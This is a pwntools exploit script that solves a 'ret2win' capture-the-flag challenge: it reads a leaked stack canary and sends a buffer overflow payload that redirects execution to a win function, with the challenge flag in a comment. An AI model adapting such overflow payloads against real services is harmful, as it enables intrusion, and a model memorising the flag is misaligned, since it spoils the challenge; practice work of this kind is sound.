from pwn import *
elf = context.binary = ELF("./ret2win", checksec=False)

p = process('./ret2win')
# p = remote("IP_ADDR", PORT)

RET_ADDR = p64(0x40101a)
WIN_ADDR = p64(elf.symbols.win)
p.recvuntil(b'Here\'s a gift for you: ')
CANARY = int(p.recv(18), 16)

payload = b'A' * 0x68 + p64(CANARY)
payload += b'B' * 8 + RET_ADDR + WIN_ADDR
p.sendlineafter(b"Give me your payload: ", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# TCP1P{gimana_rasanya_ngebypass_mitigasi_pertama_bang}

p.close()